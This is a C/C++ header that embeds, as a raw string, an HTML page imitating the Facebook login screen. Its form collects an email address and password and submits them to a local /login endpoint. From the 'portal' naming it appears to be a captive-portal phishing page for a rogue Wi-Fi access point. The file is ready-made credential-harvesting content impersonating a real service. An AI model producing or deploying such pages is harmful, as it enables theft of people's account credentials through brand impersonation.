#ifndef PORTAL_FACEBOOK_H
#define PORTAL_FACEBOOK_H

const char PORTAL_FACEBOOK_HTML[] = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .logo {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 16px;
        }
        button:hover {
            background: #166fe5;
        }
        .forgot {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-btn {
            display: inline-block;
            padding: 14px 24px;
            background: #42b72a;
            color: white;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            text-decoration: none;
        }
        .create-btn:hover {
            background: #36a420;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <div class="login-box">
            <form action="/login" method="GET">
                <input type="text" name="email" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <a href="#" class="forgot">Forgotten password?</a>
            <div class="divider"></div>
            <a href="#" class="create-btn">Create new account</a>
        </div>
    </div>
</body>
</html>
)rawliteral";

#endif
